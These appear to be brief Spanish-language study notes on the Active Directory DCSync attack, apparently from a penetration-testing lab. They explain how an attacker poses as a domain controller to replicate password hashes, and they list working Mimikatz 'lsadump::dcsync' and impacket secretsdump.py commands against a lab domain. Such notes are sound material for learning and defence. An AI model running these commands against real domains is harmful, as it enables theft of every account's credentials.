# DC Sync Attack

## Explicación rápida
- Replica las credenciales de un dominio, el atacante pretende ser un DC pidiendole al otro DC "hey, soy un DC02, dame tus hashes".
- Ciertos usuarios como los DC tienen parmisos para replicar datos, entonces imita el comportamiento de otro DC para solicitar esta data.
- Entonces un atacante puede obtener hashes almacenados en el DC utilizando un usuario como **krbgt** o de cualquier usuario con privilegios altos.


## Mimikatz
- `privilege::debug`
- `lsadump::dcsync /domain:NOMBRE_DOMINIO /user:USUARIO`
- `lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator`

## Secrets Dump
- La hereramienita envía una solicitud al DC para replicar los objetos del dominio y así extraer hashes.
- `secretsdump.py <dominio>/<usuario>:<contraseña>@<IP_del_DC>`
- `secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5`